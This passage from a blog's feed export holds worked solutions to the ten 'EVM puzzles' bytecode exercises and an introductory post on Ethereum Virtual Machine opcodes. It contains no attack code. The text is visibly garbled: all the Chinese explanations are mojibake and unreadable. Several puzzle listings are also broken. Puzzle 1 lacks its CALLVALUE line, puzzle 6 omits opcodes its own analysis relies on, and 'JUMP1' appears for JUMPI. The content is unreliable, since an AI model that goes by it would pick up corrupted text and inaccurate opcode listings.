href="https://chatgpt.com/">ChatGPT</a>;<br>è°·æ­Œå¼€å‘çš„ä¸€ä¸ªæ™ºèƒ½è½¯ä»¶ï¼š<a href="https://gemini.google.com/app">Gemini</a>ï¼›<br>ä¸€ä¸ªç¤¾åŒºçš„æ£€ç´¢é—®é¢˜ï¼š<a href="https://ethereum.stackexchange.com/">Ethereum-Stack-Exchange</a><br>ä¸€ä¸ªç¤¾åŒºçš„å…¨çƒäº¤æµå¹³å°ï¼š<a href="https://stackoverflow.com/">stackoverflow</a>;<br>webä¸€ä¸ªçŸ¥è¯†æ„å»ºå¹³å°ï¼š<a href="https://www.peeranha.io/get-started">Peerhana</a>;</p><p><a href="https://www.rareskills.io/post/solidity-interview-questions">solidityquestion</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>EVM puzzle</title>
      <link href="/2024/08/30/EVM-puzzle/"/>
      <url>/2024/08/30/EVM-puzzle/</url>
      
        <content type="html"><![CDATA[<h1 id="EVM-PUZZLE"><a href="#EVM-PUZZLE" class="headerlink" title="EVM PUZZLE"></a>EVM PUZZLE</h1><p><a href="https://github.com/fvictorio/evm-puzzles">è¿è¡Œæ¸¸æˆ</a></p><h2 id="puzzle-1-CALLVALUE"><a href="#puzzle-1-CALLVALUE" class="headerlink" title="puzzle 1 CALLVALUE"></a>puzzle 1 CALLVALUE</h2><p>é¢˜ç›®ï¼š</p><pre>pc     opcode  opcode name01      38      CODESIZE02      03      SUB03      56      JUMP04      FD      REVERT05      FD      REVERT06      5B      JUMPDEST07      00      STOP08      FD      REVERT09      FD      REVERT</pre><p>è¾“å…¥æ°å½“çš„valueï¼Œä½¿å¾—é¢˜ç›®çš„ opcode æ­£ç¡®æ‰§è¡Œï¼Œç›´åˆ°æ‰§è¡ŒSTOP</p><p>åˆ†æï¼šCALLVALUEå®é™…ä¸Šå°±æ˜¯msg.value,å®ƒä¼šå°†msg.valueå­˜å‚¨åˆ°æ ˆé¡¶,è€ŒJUMPä¼šè¯»å–æ ˆé¡¶å€¼ï¼Œå¹¶è·³è½¬åˆ°ç›¸åº”çš„å­—èŠ‚åœ°å€ï¼Œç”±JUMPDESTæ‰¿æ¥,æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©msg.value&#x3D;&#x3D;8å³å¯</p><hr><h2 id="puzzles-2-CODESIZE"><a href="#puzzles-2-CODESIZE" class="headerlink" title="puzzles 2 CODESIZE"></a>puzzles 2 CODESIZE</h2><p>é¢˜ç›®ï¼š</p><pre>pc      opcode  opcode name00      34      CALLVALUE01      38      CODESIZE02      03      SUB03      56      JUMP04      FD      REVERT05      FD      REVERT06      5B      JUMPDEST07      00      STOP08      FD      REVERT09      FD      REVERT</pre><p>msg.valueæ˜¯å¤šå°‘ï¼Ÿ</p><p>åˆ†æï¼šCALLVALUEå­˜å‚¨å€¼åˆ°æ ˆé¡¶ï¼ŒSTACKï¼š[x]ï¼ŒCODESIZEè·å–å½“å‰EVMç¯å¢ƒä¸­çš„æ“ä½œç SIZEï¼Œæ¯ä¸ªOPCODEä¸º1byteï¼Œæˆ‘ä»¬æ­¤æ—¶å†…å­˜ä¸­å…±10ä¸ªæ“ä½œç ï¼Œå› æ­¤æ‰§è¡ŒCODESIZEåï¼Œä¼šå‘æ ˆé¡¶å­˜å…¥10ï¼ŒSTACKï¼š[10, x]ï¼ŒSUBä¼šæ‰§è¡Œå‡æ³•æ“ä½œï¼Œå¹¶å°†ç»“æœå¦‚æ ˆï¼ŒSTACKï¼š[10 - x]<br>JUMPä¼šè·³åˆ°06å­—èŠ‚ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ 10 - x &#x3D; 6ï¼Œæ¨å¯¼å‡ºï¼šx &#x3D; 4ï¼Œå³msg.valueä¸º4</p><hr><h2 id="puzzles-3-CALLDATASIZE"><a href="#puzzles-3-CALLDATASIZE" class="headerlink" title="puzzles 3 CALLDATASIZE"></a>puzzles 3 CALLDATASIZE</h2><p>é¢˜ç›®ï¼š</p><pre>pc      opcode  opcode name00      36      CALLDATASIZE01      56      JUMP02      FD      REVERT03      FD      REVERT04      5B      JUMPDEST05      00      STOP</pre><p>calldataæ˜¯å¤šå°‘ï¼Ÿ</p><p>åˆ†æï¼šJUMPDESTè·³è½¬åˆ°04ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦ä¿è¯calldataåˆ°sizeä¸º4å³å¯ï¼Œå†…å®¹ä¸é™ã€‚å³len(msg.data) &#x3D;&#x3D; 4,msg.data&#x3D;&#x3D;0x11223344</p><blockquote><p>è¡¥å……ï¼šä¸€ä¸ªå­—èŠ‚ä»£è¡¨8ä½äºŒè¿›åˆ¶æ•°ï¼Œä¸€ä¸ª16è¿›åˆ¶æ•°ä»£è¡¨4ä½äºŒè¿›åˆ¶æ•°ï¼Œæ‰€ä»¥ä¿©ä¸ª16è¿›åˆ¶çš„æ•°å°±ä»£è¡¨ä¸€ä¸ªå­—èŠ‚</p></blockquote><hr><h2 id="puzzles-4-XOR"><a href="#puzzles-4-XOR" class="headerlink" title="puzzles 4 XOR"></a>puzzles 4 XOR</h2><p>é¢˜ç›®ï¼š</p><pre>pc      opcode  opcode name00      34      CALLVALUE01      38      CODESIZE02      18      XOR03      56      JUMP04      FD      REVERT05      FD      REVERT06      FD      REVERT07      FD      REVERT08      FD      REVERT09      FD      REVERT0A      5B      JUMPDEST0B      00      STOP</pre><p>valueæ˜¯å¤šå°‘ï¼Ÿ</p><p>åˆ†æ:CALLVALUEè·å–æ•°å€¼åå…¥æ ˆï¼ŒSTACKï¼š[x],CODESIZEè·å–æ•°å€¼ä¸º12å…¥æ ˆï¼ŒSTACKï¼š[12, x]<br>å¼‚æˆ–æ“ä½œï¼š<br>12ï¼š0000ï¼Œ1100<br>0Aï¼š0000ï¼Œ1010<br>xï¼š 0000ï¼Œ0110 &#x3D;ã€‹6ï¼Œæ‰€ä»¥ç­”æ¡ˆä¸ºï¼š6,å³valueä¸º6</p><hr><h2 id="puzzles-5-JUPM1"><a href="#puzzles-5-JUPM1" class="headerlink" title="puzzles 5 JUPM1"></a>puzzles 5 JUPM1</h2><p>é¢˜ç›®ï¼š</p><pre>        pc      opcode      opcode name00      34          CALLVALUE01      80          DUP102      02          MUL03      610100      PUSH2 010006      14          EQ07      600C        PUSH1 0C09      57          JUMPI0A      FD          REVERT0B      FD          REVERT0C      5B          JUMPDEST0D      00          STOP0E      FD          REVERT0F      FD          REVERT</pre><p>valueæ˜¯å¤šå°‘ï¼Ÿ</p><p>åˆ†æï¼š</p><ul><li>CALLVALUEï¼ŒSTACK-&gt; [x]</li><li>DUP1ï¼šSTACK-&gt; [xï¼Œx]</li><li>MULï¼šSTACK-&gt; [mul_result]</li><li>PUSH2 0100ï¼šSTACK-&gt; [0100ï¼Œmul_result]</li><li>EQï¼šåˆ¤æ–­stack1å’Œstack2æ˜¯å¦ç›¸ç­‰ï¼Œè‹¥ç›¸ç­‰ï¼Œåˆ™æ¸…é™¤è¿™ä¸¤ä¸ªå€¼ï¼Œå¹¶å‘æ ˆé¡¶å­˜å…¥1ï¼Œå¦åˆ™å­˜å…¥0</li><li>PUSH1 0Cï¼šSTACK-&gt; [0C, 1]</li><li>JUMPIï¼šè¯»å–stack2çš„å€¼ï¼Œå¦‚æœä¸º1ï¼Œåˆ™è·³è½¬åˆ°stack1çš„ä½ç½®ï¼Œå³0Cï¼Œæ»¡è¶³æ¡ä»¶ï¼<br>å› æ­¤æˆ‘ä»¬éœ€è¦ä½¿å¾—ï¼š0100 &#x3D; x*xï¼Œ0x0100åè¿›åˆ¶ä¸º256ï¼Œæ‰€ä»¥x &#x3D; 16ï¼Œå³valueä¸º16</li></ul><hr><h2 id="puzzles-6-CALLDATALOAD"><a href="#puzzles-6-CALLDATALOAD" class="headerlink" title="puzzles 6 CALLDATALOAD"></a>puzzles 6 CALLDATALOAD</h2><p>é¢˜ç›®ï¼š</p><pre>pc      opcode  opcode name02      35        CALLDATALOAD04      FD        REVERT05      FD        REVERT06      FD        REVERT07      FD        REVERT08      FD        REVERT09      FD        REVERT0A      5B        JUMPDEST0B      00        STOP</pre><p>calldataloadæ˜¯ å¤šå°‘ï¼Ÿ</p><p>åˆ†æï¼š</p><ul><li>PUSH1 00ï¼ŒSTACKï¼šã€0x00ã€‘</li><li>CALLDATALOADï¼šè·å–inputçš„æ•°æ®ï¼Œå³calldataï¼Œå‚æ•°ä¸º0x00ï¼Œå³ä»ç¬¬00ä½ç½®å¼€å§‹åŠ è½½</li><li>JUMPæƒ³è·³è½¬åˆ°0Aå¤„ï¼Œæ‰€ä»¥calldataçš„å€¼ä¸º0x0aï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥è¾“å…¥0x0aï¼Œæ­¤æ—¶ä¼šè¢«è½¬åŒ–ä¸ºï¼ša00000000000000000000000000000000000000000000000000000000000000ï¼Œè¿™æ˜¯é”™çš„ï¼›</li><li>ç”±äºcalldataçš„æ•°å€¼æ€»ä¸º32å­—èŠ‚çš„å€æ•°ï¼Œæ‰€ä»¥æ­¤å¤„åº”è¯¥ä¸ºï¼š0x000000000000000000000000000000000000000000000000000000000000000a</li></ul><hr><h2 id="puzzles-7-EXTCODESIZE"><a href="#puzzles-7-EXTCODESIZE" class="headerlink" title="puzzles 7 EXTCODESIZE"></a>puzzles 7 EXTCODESIZE</h2><p>é¢˜ç›®ï¼š</p><pre>pc      opcode    opcode name00      36        CALLDATASIZE01      6000      PUSH1 0003      80        DUP104      37        CALLDATACOPY05      36        CALLDATASIZE06      6000      PUSH1 0008      6000      PUSH1 000A      F0        CREATE0B      3B        EXTCODESIZE0C      6001      PUSH1 010E      14        EQ0F      6013      PUSH1 1311      57        JUMPI12      FD        REVERT13      5B        JUMPDEST14      00        STOP</pre><p>calldataæ˜¯å¤šå°‘ï¼Ÿ</p><p>åˆ†æï¼šé€æ­¥åˆ†æï¼Œ</p><pre>00      36        CALLDATASIZE    # [datasize]01      6000      PUSH1 00    # [00, datasize]03      80        DUP1        # [00, 00, datasize]04      37        CALLDATACOPY     # [] dataè¢«copyåˆ°memoryä¸­ï¼Œæ ˆè¢«æ¸…ç©º05      36        CALLDATASIZE    # [datasize]06      6000      PUSH1 00        # [00, datasize]08      6000      PUSH1 00        # [00, 00, datasize]0A      F0        CREATE    # [deployed_address] æ ˆè¢«æ¸…ç©ºï¼Œä»å†…å­˜ä¸­è¯»å–æ•°æ®ï¼Œåˆ›å»ºåˆçº¦ï¼Œè¿”å›åœ°å€ 0B      3B        EXTCODESIZE    # [address_code_size] è¾“å…¥åœ°å€ï¼Œè¿”å›åˆçº¦çš„size0C      6001      PUSH1 01    # [01, address_code_size]0E      14        EQ    # [1] address_code_sizeå¿…é¡»ä¸º1ï¼Œåç»­çš„æ‰æˆç«‹0F      6013      PUSH1 1311      57        JUMPI12      FD        REVERT13      5B        JUMPDEST14      00        STOP</pre><p>å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®è¦çš„æ“ä½œç è¦è¿”å›1ï¼Œåˆ©ç”¨returnæ“ä½œç¬¦</p><pre>pc      opcode    opcode name00      6001      PUSH1 0104      F3        RETURN</pre><p>å³ msg.data &#x3D;&#x3D; 0x60016000f3</p><hr><h2 id="puzzles-8-SWAP"><a href="#puzzles-8-SWAP" class="headerlink" title="puzzles 8 SWAP"></a>puzzles 8 SWAP</h2><p>é¢˜ç›®ï¼š</p><pre>pc      opcode    opcode name00      36        CALLDATASIZE01      6000      PUSH1 0003      80        DUP104      37        CALLDATACOPY05      36        CALLDATASIZE06      6000      PUSH1 0008      6000      PUSH1 000A      F0        CREATE0B      6000      PUSH1 000D      80        DUP10E      80        DUP10F      80        DUP110      80        DUP111      94        SWAP512      5A        GAS13      F1        CALL14      6000      PUSH1 0016      14        EQ17      601B      PUSH1 1B19      57        JUMPI1A      FD        REVERT1B      5B        JUMPDEST1C      00        STOP</pre><p>calldataæ˜¯å¤šå°‘ï¼Ÿ<br>åˆ†æï¼š</p><pre>00      36        CALLDATASIZE    # [datasize]01      6000      PUSH1 00    # [00, datasize]03      80        DUP1    # [00, 00, datasize]04      37        CALLDATACOPY    # []  copyåˆ°å†…å­˜ä¸­05      36        CALLDATASIZE    # [datasize]ï¼Œç›´æ¥ç”Ÿæˆæ•°æ®ï¼Œä¸éœ€è¦æ ˆå‚æ•°06      6000      PUSH1 00    # [00, datasize]08      6000      PUSH1 00    # [00, 00, datasize]0A      F0        CREATE    # [deployed_address]0B      6000      PUSH1 00    # [00, deployed_address]0D      80        DUP1    # [00, 00, deployed_address]0E      80        DUP1    # [00, 00, 00, deployed_address]0F      80        DUP1    # [00, 00, 00, 00, deployed_address]10      80        DUP1    # [00, 00, 00, 00, 00, deployed_address]11      94        SWAP5    # [deployed_address, 00, 00, 00, 00, 00]ï¼Œå…‘æ¢1st å’Œ 6thï¼Œä½ æ²¡æœ‰çœ‹é”™1å’Œ6ï¼Œä¸æ˜¯512      5A        GAS    # [gasAvail, deployed_address, 00, 00, 00, 00, 00] // 7ä¸ªå‚æ•°13      F1        CALL    # [0æˆ–1]è°ƒç”¨å‡½æ•°ï¼Œéœ€è¦æ˜¯0ï¼Œ0è¡¨ç¤ºå¤±è´¥ï¼Œ1è¡¨ç¤ºæˆåŠŸï¼ï¼ˆåæ¨çš„14      6000      PUSH1 00    # [00, 0æˆ–1]ï¼Œéœ€è¦æ˜¯016      14        EQ    # [0æˆ–1]ï¼Œéœ€è¦æ˜¯117      601B      PUSH1 1B    # [1B, 0æˆ–1]ï¼Œéœ€è¦æ˜¯119      57        JUMPI                       1A      FD        REVERT1B      5B        JUMPDEST1C      00        STOP</pre><p>é€æ­¥åˆ†æåï¼Œå¯å¾—çŸ¥æˆ‘ä»¬éœ€è¦åšåˆ°callè°ƒç”¨å¤±è´¥ï¼Œè¿™å°±è¦æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®revert,ç±»ä¼¼äºpuzzles#7</p><pre>pc      opcode    opcode name00      60FD      PUSH1 FD //FD æ˜¯revertæ“ä½œç¬¦çš„ç¼–å·02      6000      PUSH1 0004      53        MSTORE805      6001      PUSH1 0107      6000      PUSH1 0009      F3        RETURN</pre><p>å³calldata&#x3D; 0x60fd60005360016000f3</p><hr><h2 id="puzzles-9-LT"><a href="#puzzles-9-LT" class="headerlink" title="puzzles 9 LT"></a>puzzles 9 LT</h2><pre>pc      opcode    opcode name00      36        CALLDATASIZE01      6003      PUSH1 0303      10        LT04      6009      PUSH1 0906      57        JUMPI07      FD        REVERT08      FD        REVERT09      5B        JUMPDEST0A      34        CALLVALUE0B      36        CALLDATASIZE0C      02        MUL0D      6008      PUSH1 080F      14        EQ10      6014      PUSH1 1412      57        JUMPI13      FD        REVERT14      5B        JUMPDEST15      00        STOP</pre><p>value?<br>calldata?</p><p>åˆ†æï¼šå°±æ˜¯ä¸€ä¸ªæ¨ç†é¢˜ï¼Œ00-09:datasize&gt;3,0A-12:value*datasize&#x3D;8,datasize&#x3D;4,value&#x3D;2<br>calldataçš„å­—èŠ‚æ•°ä¸º4ï¼Œéšæ„æ„é€ calldata&#x3D;0x12345678</p><hr><h2 id="puzzles-10-ISZERO"><a href="#puzzles-10-ISZERO" class="headerlink" title="puzzles 10 ISZERO"></a>puzzles 10 ISZERO</h2><p>é¢˜ç›®ï¼š</p><pre>pc      opcode      opcode name00      38          CODESIZE01      34          CALLVALUE02      90          SWAP103      11          GT04      6008        PUSH1 0806      57          JUMPI07      FD          REVERT08      5B          JUMPDEST09      36          CALLDATASIZE0A      610003      PUSH2 00030D      90          SWAP10E      06          MOD0F      15          ISZERO10      34          CALLVALUE11      600A        PUSH1 0A13      01          ADD14      57          JUMPI15      FD          REVERT16      FD          REVERT17      FD          REVERT18      FD          REVERT19      5B          JUMPDEST1A      00          STOP</pre><p>value?<br>calldata?</p><p>åˆ†æï¼š00-06ï¼švalue&lt;23;09-0f:calldata mod 3&#x3D;&#x3D;0;10-14:value+0a&#x3D;19,æ³¨æ„19ä¸º16è¿›åˆ¶çš„æ•°ï¼Œvalue&#x3D;15,calldataçš„å­—èŠ‚æ•°ä¸º3ï¼Œéšæ„æ„é€ calldta&#x3D;0x123456</p><p>10é“EVM puzzleså°±å®Œæˆäº†ï¼ï¼ï¼</p>]]></content>
      
      
      
        <tags>
            
            <tag> EVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EVMå…¥é—¨</title>
      <link href="/2024/08/19/EVM%E5%85%A5%E9%97%A8/"/>
      <url>/2024/08/19/EVM%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Opcodes"><a href="#Opcodes" class="headerlink" title="Opcodes"></a>Opcodes</h2><p>Opcodesï¼ˆæ“ä½œç ï¼‰æ˜¯ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦çš„åŸºæœ¬å•å…ƒã€‚æˆ‘ä»¬å†™çš„Solidityæ™ºèƒ½åˆçº¦ä¼šè¢«ç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼ˆbytecodeï¼‰ï¼Œç„¶åæ‰èƒ½åœ¨EVMï¼ˆä»¥å¤ªåŠè™šæ‹Ÿæœºï¼‰ä¸Šè¿è¡Œã€‚è€Œå­—èŠ‚ç å°±æ˜¯ç”±ä¸€ç³»åˆ—Opcodesç»„æˆçš„ã€‚å½“ç”¨æˆ·åœ¨EVMä¸­è°ƒç”¨è¿™ä¸ªæ™ºèƒ½åˆçº¦çš„å‡½æ•°æ—¶ï¼ŒEVMä¼šè§£æå¹¶æ‰§è¡Œè¿™äº›Opcodesï¼Œä»¥å®ç°åˆçº¦é€»è¾‘ã€‚</p><h2 id="å¸¸è§çš„Opcodes"><a href="#å¸¸è§çš„Opcodes" class="headerlink" title="å¸¸è§çš„Opcodes"></a>å¸¸è§çš„Opcodes</h2><p><code>PUSH1</code>: å°†ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®å‹å…¥å †æ ˆã€‚ä¾‹å¦‚ï¼ŒPUSH1 0x60 å°±æ˜¯å°† 0x60 å‹å…¥å †æ ˆã€‚<br><code>DUP1</code> : å¤åˆ¶å †æ ˆé¡¶éƒ¨çš„ä¸€ä¸ªå…ƒç´ ã€‚<br><code>SWAP1</code>: äº¤æ¢å †æ ˆé¡¶éƒ¨çš„å‰ä¸¤ä¸ªå…ƒç´ ã€‚</p><p>ä¾‹å¦‚ï¼šä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„Solidityæ™ºèƒ½åˆçº¦ï¼Œå®ƒåªæœ‰ä¸€ä¸ªadd()å‡½æ•°ï¼Œè®¡ç®—1+1çš„ç»“æœå¹¶è¿”å›ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">contract Add &#123;</span><br><span class="line">    function add() public pure returns (uint256 result) &#123;</span><br><span class="line">        result = 1+1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†åˆçº¦ç¼–è¯‘åï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°åˆçº¦å¯¹åº”çš„bytecode:<strong>60806040523480156100â€¦</strong></p><p>é€šè¿‡bytecodeï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°åˆçº¦å¯¹åº”çš„opcodesä¸º:<strong>PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 â€¦</strong></p><blockquote><p>æˆ‘è®¤ä¸ºéœ€è¦ç‰¹åˆ«è®°å¿†çš„åŸºæœ¬Opcodes:<br>PUSH1:å°†ä¸€ä¸ªé•¿åº¦ä¸º1å­—èŠ‚çš„æ•°æ®å‹å…¥å †æ ˆé¡¶éƒ¨ã€‚åŒç†å¯çŸ¥ï¼šPUSH2å°±æ˜¯å‹å…¥é•¿åº¦ä¸ºä¿©ä¸ªå­—èŠ‚çš„æ•°æ®è¿›å…¥æ ˆå †é¡¶éƒ¨<br>ADD:ä¼šå¼¹å‡ºå †æ ˆé¡¶éƒ¨çš„ä¸¤ä¸ªå…ƒç´ ï¼Œè®¡ç®—å®ƒä»¬çš„å’Œï¼Œç„¶åå°†ç»“æœå‹å…¥å †æ ˆã€‚<br>PUSH0:å°±æ˜¯å°†0å‹å…¥æ ˆå †<br>MUL: ä¼šå¼¹å‡ºå †æ ˆé¡¶éƒ¨çš„ä¸¤ä¸ªå…ƒç´ ï¼Œè®¡ç®—å®ƒä»¬çš„ä¹˜ï¼Œç„¶åå°†ç»“æœå‹å…¥å †æ ˆã€‚<br>SUB: ä¼šå¼¹å‡ºå †æ ˆé¡¶éƒ¨çš„ä¸¤ä¸ªå…ƒç´ ï¼Œç¬¬äºŒä¸ªå…ƒç´ å‡å»ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œç„¶åå°†ç»“æœå‹å…¥å †æ ˆ<br>DUPx:å°±æ˜¯å¤åˆ¶ç¬¬xä¸ªå…ƒç´ åˆ°æ ˆé¡¶<br>LT:ä»å †æ ˆä¸­å¼¹å‡ºä¸¤ä¸ªå…ƒç´ ï¼Œæ¯”è¾ƒç¬¬äºŒä¸ªå…ƒç´ æ˜¯å¦å°äºç¬¬ä¸€ä¸ªå…ƒç´ ã€‚å¦‚æœæ˜¯ï¼Œé‚£ä¹ˆå°†1æ¨å…¥å †æ ˆï¼Œå¦åˆ™å°†0æ¨å…¥å †æ ˆã€‚å¦‚æœå †æ ˆå…ƒç´ ä¸è¶³ä¸¤ä¸ªï¼Œé‚£ä¹ˆä¼šæŠ›å‡ºå¼‚å¸¸ã€‚<br>GT:ä»å †æ ˆä¸­å¼¹å‡ºä¸¤ä¸ªå…ƒç´ ï¼Œæ¯”è¾ƒç¬¬äºŒä¸ªå…ƒç´ æ˜¯å¦å¤§äºç¬¬ä¸€ä¸ªå…ƒç´ ã€‚å¦‚æœæ˜¯ï¼Œé‚£ä¹ˆå°†1æ¨å…¥å †æ ˆï¼Œå¦åˆ™å°†0æ¨å…¥å †æ ˆã€‚å¦‚æœå †æ ˆå…ƒç´ ä¸è¶³ä¸¤ä¸ªï¼Œé‚£ä¹ˆä¼šæŠ›å‡ºå¼‚å¸¸ã€‚<br>EQ:ä»å †æ ˆä¸­å¼¹å‡ºä¸¤ä¸ªå…ƒç´ ï¼Œæ¯”è¾ƒç¬¬äºŒä¸ªå…ƒç´ æ˜¯å¦ç­‰äºç¬¬ä¸€ä¸ªå…ƒç´ ã€‚å¦‚æœæ˜¯ï¼Œé‚£ä¹ˆå°†1æ¨å…¥å †æ ˆï¼Œå¦åˆ™å°†0æ¨å…¥å †æ ˆã€‚å¦‚æœå †æ ˆå…ƒç´ ä¸è¶³ä¸¤ä¸ªï¼Œé‚£ä¹ˆä¼šæŠ›å‡ºå¼‚å¸¸ã€‚<br>AND:ä»æ ˆå †ä¸­å¼¹å‡ºä¿©ä¸ªå…ƒç´ ,æ¯”è¾ƒä½çº§,å¦‚2(0000 0010)å’Œ3(0000 0011),åˆ™å…¥æ ˆçš„æ˜¯2<br>OR:ä»æ ˆå †ä¸­å¼¹å‡ºä¿©ä¸ªå…ƒç´ ,æ¯”è¾ƒä½çº§,å¦‚2(0000 0010)å’Œ3(0000 0011),åˆ™å…¥æ ˆçš„æ˜¯3<br>XOR:å®ƒæ˜¯å¼‚æˆ–è¿ç®—,,å¦‚2(0000 0010)å’Œ3(0000 0011),åˆ™å…¥æ ˆçš„æ˜¯1(0000 0001),å°±æ˜¯æ¯”è¾ƒä¾æ¬¡å®ƒä»¬2è¿›åˆ¶çš„æ•°,ä¿©ä¸ª0ç›¸é‡æˆ–è€…ä¿©ä¸ª1ç›¸é‡å°±ä¸º0,ä¸åŒçš„ç›¸é‡å°±ä¸º1<br>SHL:æŒ‡ä»¤æ‰§è¡Œå·¦ç§»ä½æ“ä½œï¼Œä»å †æ ˆä¸­å¼¹å‡ºä¸¤ä¸ªå…ƒç´ ï¼Œå°†ç¬¬äºŒä¸ªå…ƒç´ å·¦ç§»ç¬¬ä¸€ä¸ªå…ƒç´ ä½æ•°ï¼Œç„¶åå°†ç»“æœæ¨å›æ ˆé¡¶ã€‚å°†2ï¼ˆ0000 0010ï¼‰å’Œ3ï¼ˆ0000 0011ï¼‰æ¨å…¥å †æ ˆï¼Œç„¶åå°†2å·¦ç§»3ä½ï¼Œç»“æœåº”è¯¥ä¸º16ï¼ˆ0001 0000ï¼‰ã€‚<br>SHR:åŒä¸Š,åªä¸è¿‡å‘å³ç§»,å­—èŠ‚ç å°†16ï¼ˆ0001 0000ï¼‰å’Œ3ï¼ˆ0000 0011ï¼‰æ¨å…¥å †æ ˆï¼Œç„¶åå°†16å³ç§»3ä½ï¼Œç»“æœåº”è¯¥ä¸º2ï¼ˆ0000 0010ï¼‰ã€‚<br>MSTORE:æŒ‡ä»¤ç”¨äºå°†ä¸€ä¸ª256ä½ï¼ˆ32å­—èŠ‚ï¼‰çš„å€¼å­˜å‚¨åˆ°å†…å­˜ä¸­ã€‚å®ƒä»å †æ ˆä¸­å¼¹å‡ºä¸¤ä¸ªå…ƒç´ ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºå†…å­˜çš„åœ°å€ï¼ˆåç§»é‡ offsetï¼‰ï¼Œç¬¬äºŒä¸ªå…ƒç´ ä¸ºå­˜å‚¨çš„å€¼ï¼ˆvalueï¼‰ã€‚<br>STOP:å®ƒçš„ä½œç”¨æ˜¯åœæ­¢å½“å‰ä¸Šä¸‹æ–‡çš„æ‰§è¡Œï¼Œå¹¶æˆåŠŸé€€å‡ºã€‚<br>JUMP:ç”¨äºæ— æ¡ä»¶è·³è½¬åˆ°ä¸€ä¸ªæ–°çš„ç¨‹åºè®¡æ•°å™¨ä½ç½®ã€‚å®ƒä»å †æ ˆä¸­å¼¹å‡ºä¸€ä¸ªå…ƒç´ ï¼Œå°†è¿™ä¸ªå…ƒç´ è®¾å®šä¸ºæ–°çš„ç¨‹åºè®¡æ•°å™¨ï¼ˆpcï¼‰çš„å€¼ã€‚æ­é…JUMPDEST(æ ‡è®°ä¸€ä¸ªæœ‰æ•ˆçš„è·³è½¬ç›®æ ‡ä½ç½®)ä½¿ç”¨<br>JUMP1:ç”¨äºæ¡ä»¶è·³è½¬ï¼Œå®ƒä»å †æ ˆä¸­å¼¹å‡ºä¸¤ä¸ªå…ƒç´ ï¼Œå¦‚æœç¬¬äºŒä¸ªå…ƒç´ ï¼ˆæ¡ä»¶ï¼Œconditionï¼‰ä¸ä¸º0ï¼Œé‚£ä¹ˆå°†ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆç›®æ ‡ï¼Œdestinationï¼‰è®¾å®šä¸ºæ–°çš„pcçš„å€¼ã€‚<br>SWAP:äº¤æ¢,å¦‚SWAP1,äº¤æ¢æ ˆé¡¶ä¸æ¬¡æ ˆé¡¶,swap2,äº¤æ¢æ ˆé¡¶ä¸ç¬¬ä¸‰ä¸ªå…ƒç´ <br>CALLDATALOAD:ä»äº¤æ˜“æˆ–åˆçº¦è°ƒç”¨çš„dataå­—æ®µåŠ è½½æ•°æ®ã€‚å®ƒä»å †æ ˆä¸­å¼¹å‡ºcalldataçš„åç§»é‡ï¼ˆoffsetï¼‰ï¼Œç„¶åä»calldataçš„offsetä½ç½®è¯»å–32å­—èŠ‚çš„æ•°æ®å¹¶å‹å…¥å †æ ˆã€‚å¦‚æœcalldataå‰©ä½™ä¸è¶³32å­—èŠ‚ï¼Œåˆ™è¡¥0ã€‚<br>CALLDATASIZE:è·å–äº¤æ˜“æˆ–åˆçº¦è°ƒç”¨çš„dataå­—æ®µçš„å­—èŠ‚é•¿åº¦ï¼Œå¹¶å‹å…¥å †æ ˆã€‚<br>CALLDATACOPY:å°†dataä¸­çš„æ•°æ®å¤åˆ¶åˆ°å†…å­˜ä¸­ã€‚å®ƒä¼šä»å †æ ˆä¸­å¼¹å‡º3ä¸ªå‚æ•°(mem_offset, calldata_offset, length)ï¼Œåˆ†åˆ«å¯¹åº”å†™åˆ°å†…å­˜çš„åç§»é‡ï¼Œè¯»å–calldataçš„åç§»é‡å’Œé•¿åº¦ã€‚<br>CODESIZE:è·å–å½“å‰åˆçº¦ä»£ç çš„å­—èŠ‚é•¿åº¦ï¼Œç„¶åå‹å…¥å †æ ˆã€‚</p></blockquote><hr><h2 id="EVMåŸºç¡€"><a href="#EVMåŸºç¡€" class="headerlink" title="EVMåŸºç¡€"></a>EVMåŸºç¡€</h2><p>ä»¥å¤ªåŠè™šæ‹Ÿæœºï¼ˆEVMï¼‰æ˜¯ä»¥å¤ªåŠåŒºå—é“¾ä¸­çš„å…³é”®ç»„ä»¶ï¼Œå……å½“å¼€å‘äººå‘˜çš„è™šæ‹Ÿè®¡ç®—æœºæˆ–è½¯ä»¶å¹³å°ã€‚è¿™é¡¹åˆ›æ–°å…è®¸åˆ›å»ºå’Œéƒ¨ç½²å»ä¸­å¿ƒåŒ–åº”ç”¨ç¨‹åºï¼ˆDAppï¼‰ä»¥åŠåœ¨ä»¥å¤ªåŠç½‘ç»œä¸Šæ‰§è¡Œæ™ºèƒ½åˆçº¦ã€‚ EVM ç”±Vitalik Buterinäº 2013 å¹´æå‡ºæ¦‚å¿µï¼Œæˆä¸ºä»¥å¤ªåŠç½‘ç»œçš„æ 